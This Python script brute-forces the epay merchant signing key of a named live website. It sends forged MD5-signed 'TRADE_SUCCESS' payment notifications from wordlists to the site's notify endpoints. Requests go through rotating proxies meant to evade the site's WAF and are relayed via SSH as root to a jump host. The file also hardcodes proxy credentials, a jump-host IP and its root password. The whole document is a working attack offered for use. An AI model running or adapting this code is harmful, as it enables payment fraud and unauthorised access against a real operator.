#!/usr/bin/env python3
"""qq1.lol epay key brute — QG proxy multi-worker via jump box (WAF-safe)"""
import hashlib
import json
import os
import shlex
import subprocess
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

BASE = "https://qq1.lol"
OUT = Path(os.environ.get("QQ1_OUT", "/data/automation/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "epay_qg.log"
HITS = OUT / "epay_hits.jsonl"
PROGRESS = OUT / "epay_qg_progress.json"

QG_KEY = os.environ.get("QG_AUTHKEY", "C413ED6D")
QG_PWD = os.environ.get("QG_AUTHPWD", "344F550A6F8B")
JP_PASS = "DX4LmrDaPfd9"
JP_HOST = "42.240.167.114"
WORKERS = int(os.environ.get("EPAY_QG_WORKERS", "12"))
BATCH = int(os.environ.get("EPAY_QG_BATCH", "50"))
DELAY = float(os.environ.get("EPAY_QG_DELAY", "0.25"))
TRADE_NO = os.environ.get("QQ1_TRADE_NO", "20260720145603146")
PRIORITY = OUT / "epay_priority_keys.txt"
BIG = Path(os.environ.get("EPAY_DICT", "/data/wordlists/epay-keys.txt"))
SSH_SEM = threading.Semaphore(6)

PARAMS = {
    "pid": "1", "trade_no": TRADE_NO, "out_trade_no": TRADE_NO,
    "type": "alipay", "name": "test", "money": "99.00", "trade_status": "TRADE_SUCCESS",
}
ENDPOINTS = ["other/epay_notify.php", "other/alipay_notify.php", "other/qqpay_notify.php"]
lock = threading.Lock()
found = threading.Event()
done = 0
start_ts = time.time()


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    with lock:
        print(line, flush=True)
        with open(LOG, "a") as f:
            f.write(line + "\n")


def epay_sign(params, key):
    items = sorted((k, v) for k, v in params.items() if k not in ("sign", "sign_type") and v != "")
    return hashlib.md5(("&".join(f"{k}={v}" for k, v in items) + key).encode()).hexdigest()


def fetch_proxies(n=12):
    out, seen = [], set()
    for _ in range(5):
        if len(out) >= n:
            break
        try:
            r = subprocess.run(
                ["curl", "-s", f"https://share.proxy.qg.net/get?key={QG_KEY}&num={min(5, n-len(out))}"],
                capture_output=True, text=True, timeout=15,
            )
            data = json.loads(r.stdout)
            if data.get("code") == "SUCCESS":
                for x in data["data"]:
                    srv = x["server"]
                    if srv not in seen:
                        seen.add(srv)
                        out.append(f"http://{QG_KEY}:{QG_PWD}@{srv}")
        except Exception:
            pass
    return out or [None]


def qg_post(proxy_url, post, ep):
    parts = ["curl", "-sk", "--max-time", "12", "-X", "POST",
             "-H", "Content-Type: application/x-www-form-urlencoded",
             "-H", f"Referer: {BASE}/", "-d", post, f"{BASE}/{ep}"]
    if proxy_url:
        parts[2:2] = ["-x", proxy_url]
    inner = " ".join(shlex.quote(p) for p in parts)
    cmd = ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{JP_HOST}", inner]
    try:
        with SSH_SEM:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        return (r.stdout or "").strip()
    except Exception as e:
        return f"err:{e}"


def try_key(key, line_no, proxy):
    if found.is_set():
        return
    data = dict(PARAMS)
    data["sign"] = epay_sign(PARAMS, key)
    data["sign_type"] = "MD5"
    post = "&".join(f"{k}={v}" for k, v in data.items())
    for ep in ENDPOINTS:
        resp = qg_post(proxy, post, ep)
        if "_guard" in resp:
            return "waf"
        low = resp.lower()
        if "success" in low or resp in ("OK", "ok"):
            hit = {"key": key, "ep": ep, "resp": resp, "line": line_no}
            log(f"*** HIT {hit}")
            with open(HITS, "a") as f:
                f.write(json.dumps(hit) + "\n")
            found.set()
            return "hit"
    global done
    with lock:
        done += 1
        if done % 100 == 0:
            rate = done / max(1, time.time() - start_ts)
            log(f"  progress done={done} rate={rate:.1f}/s")
    time.sleep(DELAY)
    return "ok"


def run_file(path, offset=0):
    keys = []
    with open(path) as f:
        for i, line in enumerate(f):
            if i < offset:
                continue
            k = line.strip()
            if k:
                keys.append((k, i))
    proxies = fetch_proxies(WORKERS)
    for batch_start in range(0, len(keys), BATCH):
        if found.is_set():
            return
        batch = keys[batch_start:batch_start + BATCH]
        with ThreadPoolExecutor(max_workers=WORKERS) as ex:
            futs = []
            for j, (key, ln) in enumerate(batch):
                proxy = proxies[j % len(proxies)]
                futs.append(ex.submit(try_key, key, ln, proxy))
            for f in as_completed(futs):
                f.result()
        PROGRESS.write_text(json.dumps({"file": str(path), "line": batch[-1][1] if batch else offset}))
        proxies = fetch_proxies(WORKERS)  # rotate each batch


def main():
    log(f"=== epay QG turbo workers={WORKERS} batch={BATCH} delay={DELAY}s ===")
    if PRIORITY.exists():
        log("phase1 priority dict")
        run_file(PRIORITY)
    if not found.is_set() and BIG.exists():
        off = 0
        if PROGRESS.exists():
            try:
                p = json.loads(PROGRESS.read_text())
                if p.get("file") == str(BIG):
                    off = p.get("line", 0)
            except Exception:
                pass
        log(f"phase2 big dict offset={off}")
        run_file(BIG, off)
    log(f"=== done total={done} elapsed={time.time()-start_ts:.0f}s ===")


if __name__ == "__main__":
    main()
